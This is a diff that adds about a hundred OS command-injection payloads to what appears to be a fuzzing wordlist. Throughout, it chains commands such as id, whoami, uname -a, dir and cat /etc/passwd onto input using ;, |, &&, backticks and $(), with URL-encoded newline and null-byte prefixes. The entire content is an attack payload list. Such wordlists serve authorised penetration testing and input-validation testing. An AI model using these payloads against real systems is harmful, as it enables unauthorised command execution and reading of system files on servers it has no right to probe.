@@ -20,3 +20,104 @@ $(id)
 | dir
 & whoami
 & ipconfig
+;id
+ ;id
+%0a;id
+%0d;id
+%00;id
+|id
+ |id
+%0a|id
+%0d|id
+%00|id
+||id
+ ||id
+%0a||id
+%0d||id
+%00||id
+&id
+ &id
+%0a&id
+%0d&id
+%00&id
+&&id
+ &&id
+%0a&&id
+%0d&&id
+%00&&id
+;whoami
+ ;whoami
+%0a;whoami
+%0d;whoami
+%00;whoami
+|whoami
+ |whoami
+%0a|whoami
+%0d|whoami
+%00|whoami
+;uname -a
+ ;uname -a
+%0a;uname -a
+%0d;uname -a
+%00;uname -a
+|cat /etc/passwd
+ |cat /etc/passwd
+%0a|cat /etc/passwd
+%0d|cat /etc/passwd
+%00|cat /etc/passwd
+&whoami
+ &whoami
+%0a&whoami
+%0d&whoami
+%00&whoami
+||whoami
+ ||whoami
+%0a||whoami
+%0d||whoami
+%00||whoami
+&dir
+ &dir
+%0a&dir
+%0d&dir
+%00&dir
+|dir
+ |dir
+%0a|dir
+%0d|dir
+%00|dir
+;dir
+ ;dir
+%0a;dir
+%0d;dir
+%00;dir
+`whoami`
+ `whoami`
+%0a`whoami`
+%0d`whoami`
+%00`whoami`
+$(whoami)
+ $(whoami)
+%0a$(whoami)
+%0d$(whoami)
+%00$(whoami)
+;ls
+|ls
+||ls
+&ls
+`ls`
+$(ls)
+;pwd
+|pwd
+||pwd
+&pwd
+`pwd`
+$(pwd)
+||dir
+`dir`
+$(dir)
+;type
+|type
+||type
+&type
+`type`
+$(type)
